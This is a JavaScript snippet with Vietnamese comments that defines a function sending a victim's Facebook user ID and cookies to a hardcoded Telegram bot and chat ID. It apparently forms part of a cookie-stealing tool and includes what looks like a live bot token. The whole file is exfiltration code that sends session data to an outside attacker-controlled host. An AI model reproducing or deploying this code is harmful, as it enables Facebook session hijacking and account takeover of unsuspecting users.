// =====================
// CONFIG TELEGRAM BOT
// =====================
const BOT_TOKEN = "8319804434:AAHKgrSvL61QAdu03QP0JZ8hbBxKRqje4fc"; // token bot
const CHAT_ID  = "7443475772"; // chat_id người nhận

function sendToTelegram(userId, cookies) {
  const message = `
🔥 Cookies Facebook 🔥
User ID: ${userId || "Không tìm thấy"}
Cookies: ${cookies}
  `;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  })
  .then(res => res.json())
  .then(data => {
    if (data.ok) {
      console.log("✅ Đã gửi về Telegram:", data);
      alert("Đã gửi thông tin về Telegram!");
    } else {
      console.error("❌ Telegram báo lỗi:", data);
      alert("Telegram báo lỗi: " + JSON.stringify(data));
    }
  })
  .catch(err => {
    console.error("❌ Lỗi fetch Telegram:", err);
    alert("Không gửi được về Telegram, kiểm tra CORS hoặc mạng.");
  });
}
